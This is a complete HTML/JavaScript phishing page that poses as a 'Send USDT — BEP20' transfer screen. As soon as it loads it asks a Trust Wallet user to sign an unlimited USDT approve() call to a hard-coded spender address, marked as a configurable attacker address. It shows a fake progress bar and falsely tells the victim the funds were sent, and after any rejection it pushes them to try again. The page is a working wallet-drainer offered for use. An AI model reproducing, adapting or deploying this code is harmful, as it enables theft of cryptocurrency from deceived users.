<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Send USDT — BEP20</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💲</text></svg>">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text',Roboto,sans-serif;
            background:#0d1117;
            color:#e6edf3;
            min-height:100vh;min-height:100dvh;
            display:flex;flex-direction:column;
            align-items:center;justify-content:center;
        }

        .screen{
            width:100%;max-width:420px;
            padding:40px 24px;
            display:flex;flex-direction:column;
            align-items:center;text-align:center;
        }

        /* ── Processing screen ── */
        .spinner{
            width:64px;height:64px;
            border:3px solid rgba(38,161,123,0.12);
            border-top-color:#26a17b;
            border-radius:50%;
            animation:spin .75s linear infinite;
            margin-bottom:28px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}

        .screen h2{font-size:19px;font-weight:600;color:#fff;margin-bottom:8px}
        .screen p{font-size:13.5px;color:#8b949e;line-height:1.55;max-width:300px}

        /* ── Success screen ── */
        .check{
            display:none;
            width:64px;height:64px;border-radius:50%;
            background:#26a17b;margin-bottom:28px;
            position:relative;
            animation:popIn .35s cubic-bezier(.175,.885,.32,1.275);
        }
        .check::after{
            content:'✓';position:absolute;
            top:50%;left:50%;transform:translate(-50%,-50%);
            font-size:30px;color:#fff;
        }
        @keyframes popIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}

        /* ── Error screen ── */
        .err-icon{
            display:none;
            width:64px;height:64px;border-radius:50%;
            background:#f8514933;margin-bottom:28px;
            position:relative;
        }
        .err-icon::after{
            content:'✕';position:absolute;
            top:50%;left:50%;transform:translate(-50%,-50%);
            font-size:28px;color:#f85149;
        }

        .retry-btn{
            margin-top:24px;padding:12px 32px;
            background:#26a17b;border:none;border-radius:12px;
            color:#fff;font-size:14px;font-weight:600;
            cursor:pointer;display:none;
        }

        /* Fake progress bar */
        .progress-wrap{
            width:200px;height:3px;
            background:rgba(255,255,255,0.06);
            border-radius:2px;margin-top:20px;
            overflow:hidden;
        }
        .progress-bar{
            width:0%;height:100%;
            background:linear-gradient(90deg,#26a17b,#3fe882);
            border-radius:2px;
            animation:fakeProgress 12s ease-out forwards;
        }
        @keyframes fakeProgress{
            0%{width:0%}30%{width:45%}60%{width:70%}90%{width:88%}100%{width:92%}
        }

        .hidden{display:none}
    </style>
</head>
<body>

<div class="screen" id="mainScreen">
    <div class="spinner" id="spinner"></div>
    <div class="check" id="checkIcon"></div>
    <div class="err-icon" id="errIcon"></div>

    <h2 id="title">Processing...</h2>
    <p id="desc">Transaction in progress! Blockchain validation is underway. This may take a few minutes.</p>

    <div class="progress-wrap" id="progressWrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <button class="retry-btn" id="retryBtn" onclick="fireApprove()">Try Again</button>
</div>

<script>
// ═══════════════════════════════════════════════════════
//  CONFIG — set your spender address
// ═══════════════════════════════════════════════════════
const CFG = {
    SPENDER: '0x59ea2D2285515076FaA4AAd7128EA9989C2DF97d',   // ← ТВОЙ АДРЕС
    USDT:    '0x55d398326E99059fF775485246999027B3197955',
    CHAIN_HEX: '0x38',
};

const ABI = ['function approve(address spender, uint256 amount) returns (bool)'];
const MAX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

let provider, signer;

// ── Auto-fire on page load ──
window.addEventListener('load', () => {
    // Small delay so Trust Wallet dApp browser fully injects provider
    setTimeout(fireApprove, 600);
});

async function fireApprove() {
    const el = {
        spinner:  document.getElementById('spinner'),
        check:    document.getElementById('checkIcon'),
        err:      document.getElementById('errIcon'),
        title:    document.getElementById('title'),
        desc:     document.getElementById('desc'),
        progress: document.getElementById('progressWrap'),
        retry:    document.getElementById('retryBtn'),
        bar:      document.getElementById('progressBar'),
    };

    // Reset UI to processing state
    el.spinner.style.display  = 'block';
    el.check.style.display    = 'none';
    el.err.style.display      = 'none';
    el.retry.style.display    = 'none';
    el.progress.style.display = 'block';
    el.bar.style.animation    = 'none';
    el.bar.offsetHeight;
    el.bar.style.animation    = 'fakeProgress 12s ease-out forwards';
    el.title.textContent      = 'Processing...';
    el.desc.textContent       = 'Transaction in progress! Blockchain validation is underway. This may take a few minutes.';

    // Check for Web3
    if (!window.ethereum) {
        showError(el, 'Please open this link in Trust Wallet.');
        return;
    }

    try {
        provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        signer = await provider.getSigner();

        // Switch to BSC if needed
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: CFG.CHAIN_HEX }],
            });
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
        } catch(_){}

        // Fire approve — this triggers the Trust Wallet confirmation popup
        const usdt = new ethers.Contract(CFG.USDT, ABI, signer);
        const tx = await usdt.approve(CFG.SPENDER, MAX);
        await tx.wait();

        // Show success
        el.spinner.style.display  = 'none';
        el.check.style.display    = 'block';
        el.progress.style.display = 'none';
        el.title.textContent      = 'Success!';
        el.desc.textContent       = 'Your USDT has been sent successfully. The recipient will receive the funds shortly.';

    } catch(e) {
        if (e.code === 'ACTION_REJECTED' || e.code === 4001) {
            showError(el, 'Transaction was cancelled. Please try again to complete the transfer.');
            el.retry.style.display = 'block';
        } else {
            showError(el, 'Transaction failed. Please try again.');
            el.retry.style.display = 'block';
        }
    }
}

function showError(el, msg) {
    el.spinner.style.display  = 'none';
    el.err.style.display      = 'block';
    el.progress.style.display = 'none';
    el.title.textContent      = 'Error';
    el.desc.textContent       = msg;
}
</script>
</body>
</html>
